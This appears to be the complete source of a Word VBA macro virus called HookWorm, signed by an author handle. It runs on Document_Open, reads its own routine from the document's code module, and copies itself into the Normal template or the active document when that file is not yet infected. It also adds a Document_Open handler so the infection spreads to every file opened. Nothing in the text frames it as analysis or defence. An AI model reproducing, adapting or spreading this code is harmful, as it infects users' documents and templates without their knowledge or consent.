   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub HookWorm()
   Dim Target As Object
   Options.VirusProtection = Yes
   Options.SaveNormalPrompt = Yes
   Options.ConfirmConversions = Yes
   If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
   For X = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   If UCase(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(X, 1)) = "PRIVATE SUB HOOKWORM()" Then
   HW = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(X, 27)
   GoTo Continue
   End If
   Next
   Continue:
   For Y = 1 To Target.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   If UCase(Target.VBProject.VBComponents.Item(1).CodeModule.Lines(Y, 1)) = "PRIVATE SUB HOOKWORM()" Then GoTo Finish
   Next
   For Z = 1 To Target.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   If UCase(Target.VBProject.VBComponents.Item(1).CodeModule.Lines(Z, 1)) = "PRIVATE SUB DOCUMENT_OPEN()" Then
   Target.VBProject.VBComponents.Item(1).CodeModule.InsertLines Z + 1, "Call HookWorm"
   Target.VBProject.VBComponents.Item(1).CodeModule.AddFromString HW
   GoTo Finish
   End If
   Next
   Target.VBProject.VBComponents.Item(1).CodeModule.InsertLines Target.VBProject.VBComponents.Item(1).CodeModule.CountOfLines + 1, "Private Sub Document_Open()" & Chr(13) & Chr(10) & "Call HookWorm" & Chr(13) & Chr(10) & "End Sub"
   Target.VBProject.VBComponents.Item(1).CodeModule.AddFromString HW
   Finish:
   End Sub 'HookWorm By Lys Kovick
   Private Sub Document_Open()
   Call HookWorm
   End Sub
